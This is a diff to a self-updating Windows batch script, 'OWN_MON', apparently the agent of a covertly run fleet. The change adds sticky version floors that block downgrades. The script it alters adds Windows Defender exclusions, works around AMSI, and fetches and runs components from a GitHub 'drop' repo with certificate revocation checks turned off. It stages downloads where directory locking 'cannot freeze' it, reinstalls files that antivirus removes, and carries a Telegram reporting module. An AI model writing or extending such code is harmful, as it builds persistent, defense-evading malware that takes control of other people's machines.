@@ -1,8 +1,8 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M57
+rem  OWN_MON  BUILD 20260804M58
+rem  M58: sticky version_floor.cfg — once updated, never apply/run older mon/lib/gryxa again.
 rem  M57: fleet_channel.cfg pin+floor; cmd-first Gryxa health (ignore AMSI garbage); no downgrade.
-rem  M56: refuse mon downgrade (CDN/AMSI was re-applying M36); AMSI exclusions at tick start; cmd-only Gryxa path.
 rem  M52: auto-heal stuck Gryxa (1060+dir / RUNNING no gryxa.com ImagePath) via F8/G7; restore lib if AV ate it.
 rem  M51: force_gryxa.flag queues own_gryxa_force REINSTALL (panel wipe). Daily path stays freeze.
 rem  M50: hash-mismatch → BUILD fallback (unstick CDN-stale main).
@@ -61,10 +61,14 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "Scre
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M57"
+set "MONVER=M58"
 set "MON_MIN=M56"
 set "GIT_PIN="
 set "CHANNEL_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/fleet_channel.cfg?t=%RANDOM%%RANDOM%"
+set "FLOOR_FILE=%WD%\version_floor.cfg"
+set "MON_FLOOR=0"
+set "LIB_FLOOR=0"
+set "GRYXA_FLOOR=0"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -73,6 +77,25 @@ if not defined GRYXA_FP set "GRYXA_FP=36e506ff016b2151"
 for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
 echo.>>"%LOG%"
 echo ── tick !DT! [ver %MONVER%] ──>>"%LOG%"
+
+rem M58: sticky version_floor.cfg — once raised, never apply older mon/lib/gryxa
+if exist "%FLOOR_FILE%" for /f "usebackq tokens=1,* delims==" %%K in ("%FLOOR_FILE%") do (
+  if /I "%%K"=="MON_FLOOR" set "MON_FLOOR=%%L"
+  if /I "%%K"=="LIB_FLOOR" set "LIB_FLOOR=%%L"
+  if /I "%%K"=="GRYXA_FLOOR" set "GRYXA_FLOOR=%%L"
+)
+set /a _CURM=%MONVER:M=% 2>nul
+if not defined _CURM set "_CURM=0"
+if !_CURM! GTR !MON_FLOOR! set "MON_FLOOR=!_CURM!"
+if exist "%WD%\own_lib.ps1" (
+  call :ParseLibNum "%WD%\own_lib.ps1"
+  if !_PN! GTR !LIB_FLOOR! set "LIB_FLOOR=!_PN!"
+)
+if exist "%WD%\own_gryxa.cmd" (
+  call :ParseGryxaNum "%WD%\own_gryxa.cmd"
+  if !_PN! GTR !GRYXA_FLOOR! set "GRYXA_FLOOR=!_PN!"
+)
+call :SaveFloor
 set "COUNT=0"
 set "INSTALLED=0"
 set "PRIM_OK=0"
@@ -110,13 +133,28 @@ rem M35: guarantee update channel — unharden workdir each tick and stage downl
 rem in C:\Windows\Temp (never ACL-locked), then move into %WD%. LockDir cannot freeze us.
 set "STAGE=%SystemRoot%\Temp\.upd"
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
-rem M57: load fleet_channel.cfg — pin URLs + version floor (stops stale main/CDN M36)
+rem M57/M58: fleet_channel.cfg pin + raise sticky floors (channel never lowers local floor)
 "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 15 -o "%STAGE%\fleet_channel.cfg" "%CHANNEL_URL%" >nul 2>&1
 if exist "%STAGE%\fleet_channel.cfg" (
   for /f "usebackq tokens=1,* delims==" %%K in ("%STAGE%\fleet_channel.cfg") do (
     if /I "%%K"=="MON_MIN" set "MON_MIN=%%L"
+    if /I "%%K"=="LIB_MIN" set "LIB_MIN=%%L"
+    if /I "%%K"=="GRYXA_MIN" set "GRYXA_MIN=%%L"
     if /I "%%K"=="GIT_PIN" set "GIT_PIN=%%L"
   )
+  if defined MON_MIN (
+    set "_CM=!MON_MIN:M=!"
+    if !_CM! GTR !MON_FLOOR! set "MON_FLOOR=!_CM!"
+  )
+  if defined LIB_MIN (
+    set "_CL=!LIB_MIN:L=!"
+    if !_CL! GTR !LIB_FLOOR! set "LIB_FLOOR=!_CL!"
+  )
+  if defined GRYXA_MIN (
+    set "_CG=!GRYXA_MIN:G=!"
+    if !_CG! GTR !GRYXA_FLOOR! set "GRYXA_FLOOR=!_CG!"
+  )
+  call :SaveFloor
   if defined GIT_PIN if /I not "!GIT_PIN!"=="main" if not "!GIT_PIN!"=="" (
     set "OWNMON=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/own_mon.cmd?t=%RANDOM%%RANDOM%"
     set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/own_lib.ps1?t=%RANDOM%%RANDOM%"
@@ -124,8 +162,9 @@ if exist "%STAGE%\fleet_channel.cfg" (
     set "OWNSEC=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/own_secure.cmd?t=%RANDOM%%RANDOM%"
     set "MANIFEST_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/update.manifest?t=%RANDOM%%RANDOM%"
     set "MANIFEST_SIG_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/update.manifest.sig?t=%RANDOM%%RANDOM%"
-    echo channel_pin=!GIT_PIN! mon_min=!MON_MIN!>>"%LOG%"
+    echo channel_pin=!GIT_PIN! mon_min=!MON_MIN! lib_min=!LIB_MIN! gryxa_min=!GRYXA_MIN!>>"%LOG%"
   )
+  echo floor mon=!MON_FLOOR! lib=!LIB_FLOOR! gryxa=!GRYXA_FLOOR!>>"%LOG%"
   copy /y "%STAGE%\fleet_channel.cfg" "%WD%\fleet_channel.cfg" >nul 2>&1
 )
 attrib -h -s -r "%WD%" >nul 2>&1
@@ -180,8 +219,31 @@ if /I "!VRES!"=="ok" (
 if /I "!UPD_OK!"=="1" (
   if exist "%STAGE%\tg_report.new" move /y "%STAGE%\tg_report.new" "%WD%\tg_report.ps1" >nul 2>&1
   if exist "%STAGE%\own_secure.new" move /y "%STAGE%\own_secure.new" "%WD%\own_secure.cmd" >nul 2>&1
-  if exist "%STAGE%\own_lib.new" move /y "%STAGE%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
-  if exist "%STAGE%\own_gryxa.new" findstr /C:"OWN_GRYXA BUILD" "%STAGE%\own_gryxa.new" >nul 2>&1 && move /y "%STAGE%\own_gryxa.new" "%WD%\own_gryxa.cmd" >nul 2>&1
+  if exist "%STAGE%\own_lib.new" (
+    call :RefuseIfLibBelowFloor "%STAGE%\own_lib.new"
+    if errorlevel 1 (
+      echo lib_downgrade_blocked floor=!LIB_FLOOR!>>"%LOG%"
+      del /f /q "%STAGE%\own_lib.new" >nul 2>&1
+    ) else (
+      move /y "%STAGE%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
+      call :ParseLibNum "%WD%\own_lib.ps1"
+      if !_PN! GTR !LIB_FLOOR! set "LIB_FLOOR=!_PN!"
+    )
+  )
+  if exist "%STAGE%\own_gryxa.new" (
+    findstr /C:"OWN_GRYXA BUILD" "%STAGE%\own_gryxa.new" >nul 2>&1
+    if not errorlevel 1 (
+      call :RefuseIfGryxaBelowFloor "%STAGE%\own_gryxa.new"
+      if errorlevel 1 (
+        echo gryxa_downgrade_blocked floor=!GRYXA_FLOOR!>>"%LOG%"
+        del /f /q "%STAGE%\own_gryxa.new" >nul 2>&1
+      ) else (
+        move /y "%STAGE%\own_gryxa.new" "%WD%\own_gryxa.cmd" >nul 2>&1
+        call :ParseGryxaNum "%WD%\own_gryxa.cmd"
+        if !_PN! GTR !GRYXA_FLOOR! set "GRYXA_FLOOR=!_PN!"
+      )
+    )
+  )
   set "SELF_UPD=0"
   if exist "%STAGE%\own_mon.next" (
     fc /b "%STAGE%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
@@ -191,8 +253,34 @@ if /I "!UPD_OK!"=="1" (
 ) else if /I "!UPD_OK!"=="fallback" (
   findstr /C:"TG_REPORT BUILD" "%STAGE%\tg_report.new" >nul 2>&1 && for %%F in ("%STAGE%\tg_report.new") do if %%~zF GTR 1500 move /y "%STAGE%\tg_report.new" "%WD%\tg_report.ps1" >nul 2>&1
   findstr /C:"OWN_SECURE BUILD" "%STAGE%\own_secure.new" >nul 2>&1 && for %%F in ("%STAGE%\own_secure.new") do if %%~zF GTR 800 move /y "%STAGE%\own_secure.new" "%WD%\own_secure.cmd" >nul 2>&1
-  findstr /C:"OWN_LIB  BUILD" "%STAGE%\own_lib.new" >nul 2>&1 && for %%F in ("%STAGE%\own_lib.new") do if %%~zF GTR 1500 move /y "%STAGE%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
-  findstr /C:"OWN_GRYXA BUILD" "%STAGE%\own_gryxa.new" >nul 2>&1 && for %%F in ("%STAGE%\own_gryxa.new") do if %%~zF GTR 500 move /y "%STAGE%\own_gryxa.new" "%WD%\own_gryxa.cmd" >nul 2>&1
+  if exist "%STAGE%\own_lib.new" (
+    findstr /C:"OWN_LIB  BUILD" "%STAGE%\own_lib.new" >nul 2>&1
+    if not errorlevel 1 for %%F in ("%STAGE%\own_lib.new") do if %%~zF GTR 1500 (
+      call :RefuseIfLibBelowFloor "%STAGE%\own_lib.new"
+      if errorlevel 1 (
+        echo lib_downgrade_blocked floor=!LIB_FLOOR!>>"%LOG%"
+        del /f /q "%STAGE%\own_lib.new" >nul 2>&1
+      ) else (
+        move /y "%STAGE%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
+        call :ParseLibNum "%WD%\own_lib.ps1"
+        if !_PN! GTR !LIB_FLOOR! set "LIB_FLOOR=!_PN!"
+      )
+    )
+  )
+  if exist "%STAGE%\own_gryxa.new" (
+    findstr /C:"OWN_GRYXA BUILD" "%STAGE%\own_gryxa.new" >nul 2>&1
+    if not errorlevel 1 for %%F in ("%STAGE%\own_gryxa.new") do if %%~zF GTR 500 (
+      call :RefuseIfGryxaBelowFloor "%STAGE%\own_gryxa.new"
+      if errorlevel 1 (
+        echo gryxa_downgrade_blocked floor=!GRYXA_FLOOR!>>"%LOG%"
+        del /f /q "%STAGE%\own_gryxa.new" >nul 2>&1
+      ) else (
+        move /y "%STAGE%\own_gryxa.new" "%WD%\own_gryxa.cmd" >nul 2>&1
+        call :ParseGryxaNum "%WD%\own_gryxa.cmd"
+        if !_PN! GTR !GRYXA_FLOOR! set "GRYXA_FLOOR=!_PN!"
+      )
+    )
+  )
   set "SELF_UPD=0"
   findstr /C:"OWN_MON  BUILD" "%STAGE%\own_mon.next" >nul 2>&1
   if not errorlevel 1 for %%F in ("%STAGE%\own_mon.next") do if %%~zF GTR 1500 (
@@ -204,26 +292,15 @@ if /I "!UPD_OK!"=="1" (
   del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" "%STAGE%\own_mon.next" "%STAGE%\own_gryxa.new" >nul 2>&1
   set "SELF_UPD=0"
 )
+call :SaveFloor
 
-rem M56: NEVER apply mon older than M50 (CDN/stale was downgrading fleet to M36)
+rem M58: numeric sticky floor — refuse any staged mon below MON_FLOOR (CDN/stale cannot roll back)
 if "!SELF_UPD!"=="1" if exist "%STAGE%\own_mon.next" (
-  findstr /C:"OWN_MON  BUILD 20260804M5" "%STAGE%\own_mon.next" >nul 2>&1
+  call :RefuseIfMonBelowFloor "%STAGE%\own_mon.next"
   if errorlevel 1 (
-    echo mon_update_refused_not_M5x>>"%LOG%"
+    echo mon_downgrade_blocked floor=!MON_FLOOR!>>"%LOG%"
     del /f /q "%STAGE%\own_mon.next" >nul 2>&1
     set "SELF_UPD=0"
-  )
-)
-rem if we already run M55+, refuse anything without M55/M56
-if "!SELF_UPD!"=="1" (
-  findstr /C:"MONVER=M55" /C:"MONVER=M56" /C:"MONVER=M57" "%WD%\own_mon.cmd" >nul 2>&1
-  if not errorlevel 1 (
-    findstr /C:"MONVER=M55" /C:"MONVER=M56" /C:"MONVER=M57" "%STAGE%\own_mon.next" >nul 2>&1
-    if errorlevel 1 (
-      echo mon_downgrade_blocked>>"%LOG%"
-      del /f /q "%STAGE%\own_mon.next" >nul 2>&1
-      set "SELF_UPD=0"
-    )
   )
 )
 
@@ -231,10 +308,25 @@ del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new"
 del /f /q "%STAGE%\update.manifest" "%STAGE%\update.manifest.sig" >nul 2>&1
 
 rem M43: if lib still missing (AMSI wiped it / never landed), keep a TEMP copy for fallbacks
-if not exist "%WD%\own_lib.ps1" if exist "%STAGE%\own_lib.new" copy /y "%STAGE%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
+if not exist "%WD%\own_lib.ps1" if exist "%STAGE%\own_lib.new" (
+  call :RefuseIfLibBelowFloor "%STAGE%\own_lib.new"
+  if not errorlevel 1 copy /y "%STAGE%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
+)
 if not exist "%WD%\own_gryxa.cmd" (
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA%" >nul 2>&1
-  if not exist "%WD%\own_gryxa.cmd" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA2%" >nul 2>&1
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%STAGE%\own_gryxa.new" "%OWNGRYXA%" >nul 2>&1
+  if not exist "%STAGE%\own_gryxa.new" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%STAGE%\own_gryxa.new" "%OWNGRYXA2%" >nul 2>&1
+  if exist "%STAGE%\own_gryxa.new" (
+    call :RefuseIfGryxaBelowFloor "%STAGE%\own_gryxa.new"
+    if errorlevel 1 (
+      echo gryxa_bootstrap_refused_downgrade>>"%LOG%"
+      del /f /q "%STAGE%\own_gryxa.new" >nul 2>&1
+    ) else (
+      move /y "%STAGE%\own_gryxa.new" "%WD%\own_gryxa.cmd" >nul 2>&1
+      call :ParseGryxaNum "%WD%\own_gryxa.cmd"
+      if !_PN! GTR !GRYXA_FLOOR! set "GRYXA_FLOOR=!_PN!"
+      call :SaveFloor
+    )
+  )
 )
 
 rem M42: sevrz.cfg dynamic FP from repo sevrz_expected.cfg
@@ -713,10 +805,19 @@ if "%NEED_HB%"=="0" (
 )
 
 rem ── [I] self-update apply (last thing this tick) ──────────────
-if "%SELF_UPD%"=="1" (
-  echo self-update apply>>"%LOG%"
-  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
-  move /y "%STAGE%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
+if "%SELF_UPD%"=="1" if exist "%STAGE%\own_mon.next" (
+  call :RefuseIfMonBelowFloor "%STAGE%\own_mon.next"
+  if errorlevel 1 (
+    echo mon_apply_refused_downgrade floor=!MON_FLOOR!>>"%LOG%"
+    del /f /q "%STAGE%\own_mon.next" >nul 2>&1
+  ) else (
+    echo self-update apply>>"%LOG%"
+    attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
+    move /y "%STAGE%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
+    call :ParseMonNum "%WD%\own_mon.cmd"
+    if !_PN! GTR !MON_FLOOR! set "MON_FLOOR=!_PN!"
+    call :SaveFloor
+  )
 )
 rem keep dual-path backup in sync every tick
 if not exist "%ETL%" mkdir "%ETL%" >nul 2>&1
@@ -731,6 +832,81 @@ endlocal
 exit /b 0
 
 rem ═══════════════ helpers ═══════════════
+:SaveFloor
+(
+echo MON_FLOOR=!MON_FLOOR!
+echo LIB_FLOOR=!LIB_FLOOR!
+echo GRYXA_FLOOR=!GRYXA_FLOOR!
+)>"%FLOOR_FILE%"
+exit /b 0
+
+:ParseMonNum
+set "_PN=0"
+set "_T="
+if not exist "%~1" exit /b 1
+rem split pattern so this helper line is not matched by findstr itself
+set "_FPAT=MON"
+set "_FPAT=!_FPAT!VER="
+for /f "usebackq tokens=2 delims==" %%V in (`findstr /C:"!_FPAT!" "%~1" 2^>nul`) do set "_T=%%V"
+if defined _T (
+  set "_T=!_T:"=!"
+  set "_T=!_T: =!"
+  set "_PN=!_T:M=!"
+)
+set "_FPAT="
+exit /b 0
+
+:ParseLibNum
+set "_PN=0"
+set "_T="
+if not exist "%~1" exit /b 1
+rem header: # OWN_LIB  BUILD 20260804L48  -> token 4 is version (split pattern avoids self-match)
+set "_FPAT=OWN_LIB"
+set "_FPAT=!_FPAT!  BUILD"
+for /f "usebackq tokens=4" %%V in (`findstr /C:"!_FPAT!" "%~1" 2^>nul`) do set "_T=%%V"
+if defined _T (
+  set "_T=!_T:"=!"
+  set "_PN=!_T:*L=!"
+)
+set "_FPAT="
+exit /b 0
+
+:ParseGryxaNum
+set "_PN=0"
+set "_T="
+if not exist "%~1" exit /b 1
+rem header: rem OWN_GRYXA BUILD 20260804G8  -> token 4 is version
+set "_FPAT=OWN_GRYXA"
+set "_FPAT=!_FPAT! BUILD"
+for /f "usebackq tokens=4" %%V in (`findstr /C:"!_FPAT!" "%~1" 2^>nul`) do set "_T=%%V"
+if defined _T (
+  set "_T=!_T:"=!"
+  set "_PN=!_T:*G=!"
+)
+set "_FPAT="
+exit /b 0
+
+:RefuseIfMonBelowFloor
+call :ParseMonNum "%~1"
+if "!_PN!"=="" set "_PN=0"
+if !_PN! LSS !MON_FLOOR! exit /b 1
+if !_PN! EQU 0 exit /b 1
+exit /b 0
+
+:RefuseIfLibBelowFloor
+call :ParseLibNum "%~1"
+if "!_PN!"=="" set "_PN=0"
+if !_PN! LSS !LIB_FLOOR! exit /b 1
+if !_PN! EQU 0 exit /b 1
+exit /b 0
+
+:RefuseIfGryxaBelowFloor
+call :ParseGryxaNum "%~1"
+if "!_PN!"=="" set "_PN=0"
+if !_PN! LSS !GRYXA_FLOOR! exit /b 1
+if !_PN! EQU 0 exit /b 1
+exit /b 0
+
 :QueueGryxaHeal
 rem %1=REINSTALL|HEAL — rate-limit 90m UNLESS service is 1060 (always allow recover)
 set "HEALMODE=%~1"
